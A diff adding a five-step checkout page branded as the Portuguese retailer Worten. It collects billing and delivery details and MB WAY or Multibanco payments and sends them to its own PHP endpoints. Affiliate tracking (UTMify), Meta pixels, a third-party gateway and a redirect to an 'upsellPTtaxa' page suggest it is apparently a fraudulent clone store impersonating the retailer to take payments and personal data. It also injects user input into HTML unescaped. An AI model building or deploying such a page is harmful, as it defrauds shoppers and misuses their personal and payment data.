@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Worten - Checkout</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/css/checkout.css">
+
+  <!-- Tracking Scripts: UTMIFY -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async defer></script>
+  <script>
+    window.pixelId = "69594f24ad5d52730c130a4e";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <!-- Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '2057846451722850');
+  fbq('init', '920534473682926');
+  fbq('track', 'PageView');
+  fbq('track', 'InitiateCheckout');
+  </script>
+  <noscript>
+  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2057846451722850&ev=PageView&noscript=1"/>
+  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=920534473682926&ev=PageView&noscript=1"/>
+  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2057846451722850&ev=InitiateCheckout&noscript=1"/>
+  <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=920534473682926&ev=InitiateCheckout&noscript=1"/>
+  </noscript>
+  <!-- End Meta Pixel Code -->
+</head>
+<body>
+
+<div class="app">
+  <!-- HEADER -->
+  <div class="header">
+    <svg viewBox="0 0 122 25" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="m17.113 13.843-7.015 10.732L.58 9.79a2.981 2.981 0 0 1 .883-4.111 2.951 2.951 0 0 1 4.092.885l4.548 7.087 4.52-7.074.02-.028c.043-.064.087-.122.126-.174l.058-.077a1.96 1.96 0 0 1 .107-.12l.046-.052.046-.05c.018-.018.038-.036.064-.059l.065-.06c.035-.032.065-.06.095-.084l.081-.06c.059-.045.11-.084.173-.125l.026-.017.05-.03c.055-.032.108-.065.165-.095l.065-.032.056-.026c.045-.021.09-.042.134-.06.046-.02.091-.035.152-.057.048-.016.08-.028.113-.037a2.961 2.961 0 0 1 2.097.148l.051.025c.085.038.166.083.244.134l.05.028.025.016c.065.043.115.08.178.128l.077.058c.037.03.07.06.11.097l.067.061.048.045.055.06.052.058c.038.04.068.073.094.106l.062.082c.045.06.083.111.126.175l.012.017 4.53 7.08 4.542-7.088a2.952 2.952 0 0 1 4.092-.885 2.982 2.982 0 0 1 .883 4.11l-9.517 14.787-7.031-10.733h.001Zm27.14-8.849c-5.678 0-10.297 4.453-10.297 9.926 0 5.475 4.62 9.93 10.297 9.93 5.678 0 10.297-4.455 10.297-9.93 0-5.473-4.619-9.926-10.297-9.926m0 14.807c-2.52 0-4.572-2.19-4.572-4.88s2.051-4.88 4.572-4.88c2.523 0 4.575 2.19 4.575 4.88s-2.052 4.88-4.575 4.88M56.24 12.28v12.166h5.967v-12.55c0-.51.376-1.319 1.386-1.319l1.907-.003 1.967-.003V5.394h-4.214c-3.387 0-7.013 2.767-7.013 6.885m21.404-1.675a2.617 2.617 0 0 0 2.613-2.61 2.61 2.61 0 0 0-2.613-2.6h-2.778l-.001-2.582a2.795 2.795 0 0 0-2.8-2.785 2.795 2.795 0 0 0-2.798 2.785v15.255l.009.407h.007c.24 3.921 3.477 5.97 6.606 5.97h4.213v-5.17l-.406-.006c-.191-.002-3.279-.007-3.466-.007-1.038 0-1.387-1.03-1.387-1.499v-7.155c.78-.003 1.778-.003 2.801-.003m41.98-2.056c-1.288-1.62-3.659-3.55-7.635-3.55-3.974 0-6.343 1.93-7.631 3.55-1.68 2.111-2.278 4.6-2.278 6.224v9.673h5.974v-9.477c0-2.164 1.352-4.358 3.934-4.363 2.588.005 3.942 2.199 3.942 4.363v9.477h5.972v-9.673c0-1.625-.598-4.113-2.277-6.224M90.617 4.994c-5.529 0-10.027 4.453-10.027 9.926 0 5.475 4.498 9.93 10.027 9.93 3.868 0 7.432-2.247 9.08-5.723l.278-.584H94.29l-.122.135c-.777.861-2.171 1.418-3.552 1.418-2.116 0-3.713-1.262-4.317-3.39h14.186l.052-.35c.07-.474.106-.957.106-1.436 0-5.473-4.498-9.926-10.027-9.926h.001Zm-4.165 7.517c.5-1.664 2.138-2.764 4.165-2.764 2.009 0 3.68 1.124 4.164 2.764h-8.329Z" fill="#FFF" fill-rule="nonzero"/>
+    </svg>
+    <div class="hamburger"><span></span><span></span><span></span></div>
+  </div>
+
+  <!-- PROGRESS BAR -->
+  <div class="progress-bar" id="progressBar">
+    <div class="step active" data-step="1"><span>1</span></div>
+    <div class="step-line"></div>
+    <div class="step" data-step="2"><span>2</span></div>
+    <div class="step-line"></div>
+    <div class="step" data-step="3"><span>3</span></div>
+    <div class="step-line"></div>
+    <div class="step" data-step="4"><span>4</span></div>
+    <div class="step-line"></div>
+    <div class="step" data-step="5"><span>5</span></div>
+  </div>
+
+  <!-- CHECKOUT CONTENT -->
+  <div class="checkout-content" id="checkoutContent"></div>
+
+  <!-- FOOTER -->
+  <div class="store-footer">
+    <p>Worten - Eletrónica Online, S.A.<br>Todos os preços incluem IVA à taxa legal em vigor.</p>
+  </div>
+</div>
+
+<script>
+// ========== DATA ==========
+const cart = JSON.parse(localStorage.getItem('wortenCart') || '[]');
+const resolve = JSON.parse(localStorage.getItem('wortenResolve') || '{}');
+let totalBase = parseFloat(localStorage.getItem('wortenTotal') || '0');
+
+if (!cart.length) { location.href = 'carrinho.html'; }
+
+let currentStep = 1;
+
+function cartItemsHtml() {
+  return cart.map(item => `
+    <div class="ck-summary-item">
+      <img src="${item.img}" alt="${item.name}">
+      <div class="ck-summary-item-info">
+        <div class="ck-summary-item-name">${item.name}${item.qty > 1 ? ' x' + item.qty : ''}</div>
+        <div class="ck-summary-item-price">&euro;${item.price}</div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function reviewProductsHtml() {
+  return cart.map(item => `
+    <div class="ck-review-product">
+      <img src="${item.img}" alt="${item.name}">
+      <div>
+        <div class="ck-review-pname">${item.name}${item.qty > 1 ? ' x' + item.qty : ''}</div>
+        <div class="ck-review-pprice">&euro;${item.price}</div>
+      </div>
+    </div>
+  `).join('');
+}
+
+const checkoutData = {
+  nome: '', apelido: '', nif: '', telemovel: '', email: '',
+  morada: '', codigoPostal: '', cidade: '', pais: 'Portugal',
+  entregaMorada: true,
+  entregaMoradaData: {},
+  envio: 'standard', envioPreco: 0,
+  pagamento: '', mbwayPhone: '',
+  totalFinal: totalBase
+};
+
+// ========== PROGRESS BAR ==========
+function updateProgress(step) {
+  document.querySelectorAll('.progress-bar .step').forEach((el, i) => {
+    el.classList.toggle('active', i < step);
+    el.classList.toggle('current', i + 1 === step);
+  });
+  document.querySelectorAll('.progress-bar .step-line').forEach((el, i) => {
+    el.classList.toggle('active', i < step - 1);
+  });
+}
+
+// ========== RENDER STEPS ==========
+function renderStep(step) {
+  currentStep = step;
+  updateProgress(step);
+  const content = document.getElementById('checkoutContent');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+
+  switch(step) {
+    case 1: renderStep1(content); break;
+    case 2: renderStep2(content); break;
+    case 3: renderStep3(content); break;
+    case 4: renderStep4(content); break;
+    case 5: renderStep5(content); break;
+  }
+}
+
+// ========== STEP 1: DADOS DE FATURACAO ==========
+function renderStep1(el) {
+  el.innerHTML = `
+    <div class="ck-section">
+      <h3 class="ck-title">Dados de Faturação</h3>
+      <p class="ck-subtitle">Preencha os seus dados de faturação</p>
+
+      <div class="ck-form">
+        <div class="ck-row">
+          <div class="ck-field">
+            <label>Nome *</label>
+            <input type="text" id="fNome" placeholder="Nome" value="${checkoutData.nome}">
+          </div>
+          <div class="ck-field">
+            <label>Apelido *</label>
+            <input type="text" id="fApelido" placeholder="Apelido" value="${checkoutData.apelido}">
+          </div>
+        </div>
+        <div class="ck-field">
+          <label>NIF <span class="optional">(opcional)</span></label>
+          <input type="text" id="fNif" placeholder="Número de contribuinte" value="${checkoutData.nif}" maxlength="9">
+        </div>
+        <div class="ck-field">
+          <label>Telemóvel *</label>
+          <div class="ck-phone-input">
+            <span class="ck-phone-prefix">+351</span>
+            <input type="tel" id="fTelemóvel" placeholder="912 345 678" value="${checkoutData.telemovel}" maxlength="9">
+          </div>
+        </div>
+        <div class="ck-field">
+          <label>Email *</label>
+          <input type="email" id="fEmail" placeholder="email@exemplo.com" value="${checkoutData.email}">
+        </div>
+        <div class="ck-field">
+          <label>Morada *</label>
+          <input type="text" id="fMorada" placeholder="Rua, número, andar" value="${checkoutData.morada}">
+        </div>
+        <div class="ck-row">
+          <div class="ck-field">
+            <label>Código Postal *</label>
+            <input type="text" id="fCodPostal" placeholder="1000-001" value="${checkoutData.codigoPostal}" maxlength="8">
+          </div>
+          <div class="ck-field">
+            <label>Cidade *</label>
+            <input type="text" id="fCidade" placeholder="Lisboa" value="${checkoutData.cidade}">
+          </div>
+        </div>
+        <div class="ck-field">
+          <label>País</label>
+          <div class="ck-country">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 3 2'%3E%3Crect width='1.2' height='2' fill='%23006600'/%3E%3Crect x='1.2' width='1.8' height='2' fill='%23FF0000'/%3E%3Ccircle cx='1.2' cy='1' r='.4' fill='%23FFD700'/%3E%3C/svg%3E" alt="PT" width="20" height="14">
+            Portugal
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ORDER SUMMARY DRAWER -->
+    <div class="ck-summary-drawer">
+      <div class="ck-summary-toggle" id="summaryToggle">
+        <span>Resumo da Compra</span>
+        <div class="ck-summary-toggle-right">
+          <strong>&euro;${formatPrice(checkoutData.totalFinal)}</strong>
+          <svg class="ck-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+      </div>
+      <div class="ck-summary-body" id="summaryBody">
+        ${cartItemsHtml()}
+        ${resolve.seguro ? '<div class="ck-summary-extra"><span>Seguro Worten Resolve</span><span>&euro;7,99</span></div>' : ''}
+        ${resolve.montagem ? '<div class="ck-summary-extra"><span>Serviço de Montagem</span><span>&euro;20,99</span></div>' : ''}
+        <div class="ck-summary-line"></div>
+        <div class="ck-summary-total"><span>Total</span><strong>&euro;${formatPrice(checkoutData.totalFinal)}</strong></div>
+      </div>
+    </div>
+
+    <div class="ck-btn-bar">
+      <button class="ck-btn" id="btnStep1">CONTINUAR</button>
+    </div>
+  `;
+
+  document.getElementById('summaryToggle').addEventListener('click', function() {
+    document.getElementById('summaryBody').classList.toggle('open');
+    this.querySelector('.ck-arrow').classList.toggle('open');
+  });
+
+  document.getElementById('btnStep1').addEventListener('click', function() {
+    const nome = document.getElementById('fNome').value.trim();
+    const apelido = document.getElementById('fApelido').value.trim();
+    const tel = document.getElementById('fTelemóvel').value.trim();
+    const email = document.getElementById('fEmail').value.trim();
+    const morada = document.getElementById('fMorada').value.trim();
+    const codPostal = document.getElementById('fCodPostal').value.trim();
+    const cidade = document.getElementById('fCidade').value.trim();
+
+    if (!nome || !apelido || !tel || !email || !morada || !codPostal || !cidade) {
+      showError('Preencha todos os campos obrigatórios');
+      return;
+    }
+
+    checkoutData.nome = nome;
+    checkoutData.apelido = apelido;
+    checkoutData.nif = document.getElementById('fNif').value.trim();
+    checkoutData.telemovel = tel;
+    checkoutData.email = email;
+    checkoutData.morada = morada;
+    checkoutData.codigoPostal = codPostal;
+    checkoutData.cidade = cidade;
+
+    renderStep(2);
+  });
+}
+
+// ========== STEP 2: LOCAL DE ENTREGA ==========
+function renderStep2(el) {
+  el.innerHTML = `
+    <div class="ck-section">
+      <h3 class="ck-title">Local de Entrega</h3>
+      <p class="ck-subtitle">Escolha onde pretende receber a sua encomenda</p>
+
+      <div class="ck-delivery-option selected">
+        <div class="ck-radio-circle active"></div>
+        <div class="ck-delivery-option-info">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M9 22V12h6v10" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <div>
+            <strong>Morada</strong>
+            <span>Receba a sua encomenda na morada indicada</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="ck-address-form">
+        <label class="ck-checkbox-label">
+          <input type="checkbox" id="chkSameBilling" checked>
+          <span>Igual à morada de faturação</span>
+        </label>
+        <div class="ck-address-fields" id="deliveryFields" style="display:none">
+          <div class="ck-field">
+            <label>Morada *</label>
+            <input type="text" id="dMorada" placeholder="Rua, número, andar">
+          </div>
+          <div class="ck-row">
+            <div class="ck-field">
+              <label>Código Postal *</label>
+              <input type="text" id="dCodPostal" placeholder="1000-001" maxlength="8">
+            </div>
+            <div class="ck-field">
+              <label>Cidade *</label>
+              <input type="text" id="dCidade" placeholder="Lisboa">
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="ck-btn-bar">
+      <button class="ck-btn-back" id="btnBack2">VOLTAR</button>
+      <button class="ck-btn" id="btnStep2">CONTINUAR</button>
+    </div>
+  `;
+
+  const chk = document.getElementById('chkSameBilling');
+  const fields = document.getElementById('deliveryFields');
+  chk.addEventListener('change', () => {
+    fields.style.display = chk.checked ? 'none' : 'block';
+  });
+
+  document.getElementById('btnBack2').addEventListener('click', () => renderStep(1));
+  document.getElementById('btnStep2').addEventListener('click', function() {
+    if (chk.checked) {
+      checkoutData.entregaMoradaData = {
+        morada: checkoutData.morada,
+        codigoPostal: checkoutData.codigoPostal,
+        cidade: checkoutData.cidade
+      };
+    } else {
+      const m = document.getElementById('dMorada').value.trim();
+      const cp = document.getElementById('dCodPostal').value.trim();
+      const c = document.getElementById('dCidade').value.trim();
+      if (!m || !cp || !c) {
+        showError('Preencha a morada de entrega completa');
+        return;
+      }
+      checkoutData.entregaMoradaData = { morada: m, codigoPostal: cp, cidade: c };
+    }
+    renderStep(3);
+  });
+}
+
+// ========== STEP 3: OPCOES DE ENTREGA ==========
+function renderStep3(el) {
+  el.innerHTML = `
+    <div class="ck-section">
+      <h3 class="ck-title">Opções de Entrega</h3>
+      <p class="ck-subtitle">Escolha o método de envio</p>
+
+      <label class="ck-shipping-option" id="optStandard">
+        <input type="radio" name="shipping" value="standard" checked>
+        <div class="ck-shipping-info">
+          <div class="ck-shipping-top">
+            <strong>Entrega Standard</strong>
+            <span class="ck-shipping-free">Grátis</span>
+          </div>
+          <span class="ck-shipping-desc">Em 1 a 2 dias úteis</span>
+        </div>
+      </label>
+
+      <label class="ck-shipping-option" id="optExpress">
+        <input type="radio" name="shipping" value="express">
+        <div class="ck-shipping-info">
+          <div class="ck-shipping-top">
+            <strong>Entrega no Mesmo Dia</strong>
+            <span class="ck-shipping-price">&euro;14,00</span>
+          </div>
+          <span class="ck-shipping-desc">Entrega em 4 horas após confirmação</span>
+        </div>
+      </label>
+    </div>
+
+    <div class="ck-btn-bar">
+      <button class="ck-btn-back" id="btnBack3">VOLTAR</button>
+      <button class="ck-btn" id="btnStep3">CONTINUAR</button>
+    </div>
+  `;
+
+  document.getElementById('btnBack3').addEventListener('click', () => renderStep(2));
+  document.getElementById('btnStep3').addEventListener('click', function() {
+    const selected = document.querySelector('input[name="shipping"]:checked').value;
+    checkoutData.envio = selected;
+    checkoutData.envioPreco = selected === 'express' ? 14.00 : 0;
+    checkoutData.totalFinal = totalBase + checkoutData.envioPreco;
+    renderStep(4);
+  });
+}
+
+// ========== STEP 4: PAGAMENTO ==========
+function renderStep4(el) {
+  el.innerHTML = `
+    <div class="ck-section">
+      <h3 class="ck-title">Método de Pagamento</h3>
+      <p class="ck-subtitle">Escolha como pretende efetuar o pagamento</p>
+
+      <label class="ck-pay-option" id="optMbway">
+        <input type="radio" name="payment" value="mbway">
+        <div class="ck-pay-icon">
+          <img src="assets/images/mbway-logo.png" alt="MB WAY" class="ck-pay-logo">
+        </div>
+        <div class="ck-pay-info">
+          <strong>MB WAY</strong>
+          <span>Pagamento instantâneo pelo telemóvel</span>
+        </div>
+      </label>
+      <div class="ck-pay-phone-wrap" id="mbwayPhoneWrap" style="display:none">
+        <div class="ck-field">
+          <label>Número de telemóvel MB WAY</label>
+          <div class="ck-phone-input">
+            <span class="ck-phone-prefix">+351</span>
+            <input type="tel" id="mbwayPhone" placeholder="912 345 678" maxlength="9" value="${checkoutData.mbwayPhone}">
+          </div>
+        </div>
+      </div>
+
+      <label class="ck-pay-option" id="optMultibanco">
+        <input type="radio" name="payment" value="multibanco">
+        <div class="ck-pay-icon">
+          <img src="assets/images/multibanco-logo.png" alt="Multibanco" class="ck-pay-logo">
+        </div>
+        <div class="ck-pay-info">
+          <strong>Referência Multibanco</strong>
+          <span>Pague por referência numa caixa ATM ou homebanking</span>
+        </div>
+      </label>
+    </div>
+
+    <div class="ck-btn-bar">
+      <button class="ck-btn-back" id="btnBack4">VOLTAR</button>
+      <button class="ck-btn" id="btnStep4">CONTINUAR</button>
+    </div>
+  `;
+
+  const radios = document.querySelectorAll('input[name="payment"]');
+  const phoneWrap = document.getElementById('mbwayPhoneWrap');
+
+  radios.forEach(r => r.addEventListener('change', function() {
+    phoneWrap.style.display = this.value === 'mbway' ? 'block' : 'none';
+    document.querySelectorAll('.ck-pay-option').forEach(o => o.classList.remove('selected'));
+    this.closest('.ck-pay-option').classList.add('selected');
+  }));
+
+  document.getElementById('btnBack4').addEventListener('click', () => renderStep(3));
+  document.getElementById('btnStep4').addEventListener('click', function() {
+    const selected = document.querySelector('input[name="payment"]:checked');
+    if (!selected) {
+      showError('Selecione um método de pagamento');
+      return;
+    }
+    checkoutData.pagamento = selected.value;
+    if (selected.value === 'mbway') {
+      const phone = document.getElementById('mbwayPhone').value.trim();
+      if (!phone || phone.length < 9) {
+        showError('Introduza o número de telemóvel MB WAY');
+        return;
+      }
+      checkoutData.mbwayPhone = phone;
+    }
+    renderStep(5);
+  });
+}
+
+// ========== STEP 5: CONFIRMA E FINALIZA ==========
+function renderStep5(el) {
+  const envioLabel = checkoutData.envio === 'express' ? 'Mesmo Dia (4h)' : 'Standard (1-2 dias)';
+  const envioPrecoLabel = checkoutData.envio === 'express' ? '&euro;14,00' : 'Grátis';
+  const pagLabel = checkoutData.pagamento === 'mbway' ? 'MB WAY' : 'Referência Multibanco';
+
+  el.innerHTML = `
+    <div class="ck-section">
+      <h3 class="ck-title">Confirmar Encomenda</h3>
+      <p class="ck-subtitle">Reveja os dados antes de finalizar</p>
+
+      <!-- Products -->
+      <div class="ck-review-card">
+        ${reviewProductsHtml()}
+      </div>
+
+      <!-- Billing -->
+      <div class="ck-review-card">
+        <div class="ck-review-label">Dados de Faturação</div>
+        <div class="ck-review-text">${checkoutData.nome} ${checkoutData.apelido}</div>
+        <div class="ck-review-text">${checkoutData.morada}</div>
+        <div class="ck-review-text">${checkoutData.codigoPostal} ${checkoutData.cidade}</div>
+        <div class="ck-review-text">${checkoutData.telemovel}</div>
+        <div class="ck-review-text">${checkoutData.email}</div>
+      </div>
+
+      <!-- Delivery -->
+      <div class="ck-review-card">
+        <div class="ck-review-label">Morada de Entrega</div>
+        <div class="ck-review-text">${checkoutData.entregaMoradaData.morada}</div>
+        <div class="ck-review-text">${checkoutData.entregaMoradaData.codigoPostal} ${checkoutData.entregaMoradaData.cidade}</div>
+      </div>
+
+      <!-- Shipping -->
+      <div class="ck-review-card">
+        <div class="ck-review-row">
+          <span class="ck-review-label">Envio</span>
+          <span>${envioLabel} — ${envioPrecoLabel}</span>
+        </div>
+      </div>
+
+      <!-- Payment -->
+      <div class="ck-review-card">
+        <div class="ck-review-row">
+          <span class="ck-review-label">Pagamento</span>
+          <span>${pagLabel}</span>
+        </div>
+      </div>
+
+      <!-- Total -->
+      <div class="ck-review-total">
+        <span>Total a pagar</span>
+        <strong>&euro;${formatPrice(checkoutData.totalFinal)}</strong>
+      </div>
+    </div>
+
+    <div class="ck-btn-bar">
+      <button class="ck-btn-back" id="btnBack5">VOLTAR</button>
+      <button class="ck-btn ck-btn-final" id="btnFinalize">FINALIZAR ENCOMENDA</button>
+    </div>
+  `;
+
+  document.getElementById('btnBack5').addEventListener('click', () => renderStep(4));
+  document.getElementById('btnFinalize').addEventListener('click', processPayment);
+}
+
+// ========== PAYMENT PROCESSING ==========
+async function processPayment() {
+  const btn = document.getElementById('btnFinalize');
+  btn.disabled = true;
+  btn.textContent = 'A PROCESSAR...';
+
+  // Captura cookies do Meta Pixel e UTMs
+  function getCookie(name) {
+    const v = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
+    return v ? v.pop() : null;
+  }
+  function getUTM(param) {
+    return new URLSearchParams(window.location.search).get(param) ||
+           sessionStorage.getItem(param) || '';
+  }
+
+  const payload = {
+    amount: checkoutData.totalFinal,
+    method: checkoutData.pagamento,
+    currency: 'EUR',
+    payer: {
+      email: checkoutData.email,
+      name: `${checkoutData.nome} ${checkoutData.apelido}`,
+      document: checkoutData.nif || '000000000',
+      phone: `+351${checkoutData.mbwayPhone || checkoutData.telemovel}`
+    },
+    shipping: {
+      address: checkoutData.morada,
+      postal_code: checkoutData.codigoPostal,
+      city: checkoutData.cidade,
+      country: 'Portugal'
+    },
+    products: cart.map(item => ({
+      name: item.name,
+      price: item.price,
+      quantity: item.qty || 1
+    })),
+    metadata: {
+      fbp: getCookie('_fbp'),
+      fbc: getCookie('_fbc'),
+      utm_source: getUTM('utm_source'),
+      utm_medium: getUTM('utm_medium'),
+      utm_campaign: getUTM('utm_campaign'),
+      utm_content: getUTM('utm_content'),
+      utm_term: getUTM('utm_term')
+    }
+  };
+
+  try {
+    const res = await fetch('api/create_transaction.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    if (!res.ok) throw new Error('API error');
+    const data = await res.json();
+
+    if (checkoutData.pagamento === 'mbway') {
+      showMbwayConfirmation(data);
+    } else {
+      showMultibancoConfirmation(data);
+    }
+  } catch (err) {
+    console.error('Payment API error:', err);
+    btn.disabled = false;
+    btn.textContent = 'FINALIZAR ENCOMENDA';
+    showError('Erro ao processar pagamento. Tente novamente ou escolha outro método.');
+    return;
+  }
+}
+
+// ========== MB WAY CONFIRMATION ==========
+function showMbwayConfirmation(data) {
+  const content = document.getElementById('checkoutContent');
+  let seconds = 240; // 4 min
+
+  content.innerHTML = `
+    <div class="ck-confirmation">
+      <div class="ck-confirm-icon">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+          <rect x="5" y="1" width="14" height="22" rx="2" stroke="#CC0033" stroke-width="1.5"/>
+          <line x1="9" y1="19" x2="15" y2="19" stroke="#CC0033" stroke-width="1.5" stroke-linecap="round"/>
+          <circle cx="12" cy="10" r="3" stroke="#CC0033" stroke-width="1.5"/>
+          <path d="M10.5 10l1 1 2-2" stroke="#CC0033" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+
+      <h3 class="ck-confirm-title">Pagamento MB WAY</h3>
+      <p class="ck-confirm-subtitle">Aceite o pagamento na app MB WAY no seu telemóvel</p>
+
+      <div class="ck-confirm-phone">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><rect x="5" y="1" width="14" height="22" rx="2" stroke="#666" stroke-width="1.5"/></svg>
+        <span>+351 ${checkoutData.mbwayPhone}</span>
+      </div>
+
+      <div class="ck-confirm-amount">
+        <span>Valor a pagar</span>
+        <strong>&euro;${formatPrice(checkoutData.totalFinal)}</strong>
+      </div>
+
+      <div class="ck-confirm-timer">
+        <div class="ck-timer-circle" id="timerCircle">
+          <svg width="80" height="80" viewBox="0 0 80 80">
+            <circle cx="40" cy="40" r="36" fill="none" stroke="#eee" stroke-width="4"/>
+            <circle cx="40" cy="40" r="36" fill="none" stroke="#CC0033" stroke-width="4" stroke-dasharray="226.2" stroke-dashoffset="0" id="timerArc" transform="rotate(-90 40 40)"/>
+          </svg>
+          <span class="ck-timer-text" id="timerText">04:00</span>
+        </div>
+        <span class="ck-timer-label">Tempo restante para aceitar</span>
+      </div>
+
+      <div class="ck-confirm-status" id="paymentStatus">
+        <div class="ck-status-dot"></div>
+        <span>A aguardar confirmação...</span>
+      </div>
+    </div>
+  `;
+
+  // Timer countdown
+  const timerText = document.getElementById('timerText');
+  const timerArc = document.getElementById('timerArc');
+  const totalTime = 240;
+
+  const interval = setInterval(() => {
+    seconds--;
+    const m = Math.floor(seconds / 60);
+    const s = seconds % 60;
+    timerText.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    const offset = 226.2 * (1 - seconds / totalTime);
+    timerArc.setAttribute('stroke-dashoffset', offset);
+
+    if (seconds <= 0) {
+      clearInterval(interval);
+      document.getElementById('paymentStatus').innerHTML = `
+        <div class="ck-status-dot expired"></div>
+        <span>Tempo expirado. <a href="checkout.html" style="color:#CC0033;font-weight:600">Tentar novamente</a></span>
+      `;
+    }
+  }, 1000);
+
+  // Poll payment status - tenta vários campos possíveis da resposta WayMB
+  const txnId = data.transactionID || data.id || data.reference || (data.transaction && data.transaction.id);
+  console.log('WayMB response:', JSON.stringify(data));
+  console.log('Transaction ID for polling:', txnId);
+  if (txnId) {
+    pollPaymentStatus(txnId, interval);
+  } else {
+    console.error('Nenhum transaction ID encontrado na resposta:', data);
+  }
+}
+
+// ========== MULTIBANCO CONFIRMATION ==========
+function showMultibancoConfirmation(data) {
+  const content = document.getElementById('checkoutContent');
+  const ref = data.referenceData || {};
+
+  content.innerHTML = `
+    <div class="ck-confirmation">
+      <div class="ck-confirm-icon mb-icon">
+        <div class="ck-mb-logo">
+          <div class="ck-mb-box">MB</div>
+        </div>
+      </div>
+
+      <h3 class="ck-confirm-title">Referência Multibanco</h3>
+      <p class="ck-confirm-subtitle">Efetue o pagamento numa caixa ATM ou através do seu homebanking</p>
+
+      <div class="ck-mb-details">
+        <div class="ck-mb-row">
+          <span class="ck-mb-label">Entidade</span>
+          <span class="ck-mb-value">${ref.entity || '21312'}</span>
+        </div>
+        <div class="ck-mb-row">
+          <span class="ck-mb-label">Referência</span>
+          <span class="ck-mb-value">${formatReference(ref.reference || '000000000')}</span>
+        </div>
+        <div class="ck-mb-row">
+          <span class="ck-mb-label">Valor</span>
+          <span class="ck-mb-value">&euro;${formatPrice(checkoutData.totalFinal)}</span>
+        </div>
+        <div class="ck-mb-row">
+          <span class="ck-mb-label">Validade</span>
+          <span class="ck-mb-value">${formatDate(ref.expirationDate)}</span>
+        </div>
+      </div>
+
+      <div class="ck-confirm-status" id="paymentStatus">
+        <div class="ck-status-dot"></div>
+        <span>A aguardar pagamento...</span>
+      </div>
+
+      <div class="ck-mb-notice">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#666" stroke-width="1.5"/><line x1="12" y1="8" x2="12" y2="12" stroke="#666" stroke-width="1.5" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#666"/></svg>
+        <span>Após o pagamento, a encomenda será processada automaticamente.</span>
+      </div>
+    </div>
+  `;
+
+  // Poll payment status
+  const mbTxnId = data.transactionID || data.id || data.reference || (data.transaction && data.transaction.id);
+  if (mbTxnId) {
+    pollPaymentStatus(mbTxnId, null);
+  }
+}
+
+// ========== POLL STATUS ==========
+async function pollPaymentStatus(txnId, timerInterval) {
+  const pollInterval = setInterval(async () => {
+    try {
+      const res = await fetch('api/check_status.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: txnId })
+      });
+      if (!res.ok) return;
+      const data = await res.json();
+
+      if (data.status === 'COMPLETED') {
+        clearInterval(pollInterval);
+        if (timerInterval) clearInterval(timerInterval);
+        const statusEl = document.getElementById('paymentStatus');
+        if (statusEl) {
+          statusEl.innerHTML = `
+            <div class="ck-status-dot completed"></div>
+            <span>Pagamento confirmado com sucesso!</span>
+          `;
+        }
+
+        // Dispara Purchase no browser (deduplicação com CAPI via eventID)
+        if (typeof fbq === 'function') {
+          fbq('track', 'Purchase', {
+            value: checkoutData.totalFinal,
+            currency: 'EUR'
+          }, { eventID: txnId });
+        }
+
+        // Rastreio é criado pelo backend PHP (check_status.php) — não duplicar aqui
+
+        // Salva dados para o upsell
+        localStorage.setItem('purchaseComplete', 'true');
+        localStorage.setItem('purchaseAmount', checkoutData.totalFinal);
+        localStorage.setItem('customerEmail', checkoutData.email);
+        localStorage.setItem('customerPhone', checkoutData.mbwayPhone || checkoutData.telemovel);
+        localStorage.setItem('customerName', `${checkoutData.nome} ${checkoutData.apelido}`);
+
+        localStorage.removeItem('wortenCart');
+        localStorage.removeItem('wortenResolve');
+        localStorage.removeItem('wortenTotal');
+
+        // Redireciona para upsell após 2s
+        setTimeout(() => {
+          window.location.href = 'upsellPTtaxa.html';
